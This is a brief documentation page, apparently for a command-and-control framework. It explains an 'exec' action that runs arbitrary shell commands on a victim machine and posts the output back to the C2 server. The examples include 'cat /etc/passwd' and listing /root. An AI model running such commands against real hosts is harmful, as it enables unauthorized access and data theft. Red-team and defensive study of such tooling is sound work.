---
title: Execute Commands
description: Runs arbitrary shell commands on the victim and posts results back to the C2.
---

The `exec` action runs an arbitrary shell command on the victim via `/bin/sh -c` and posts stdout, stderr, and exit code back to the C2.

```
exec:id
exec:cat /etc/passwd
exec:ls -la /root
```

![exec:whoami result in the C2 dashboard](/c2-exec-whoami.png)
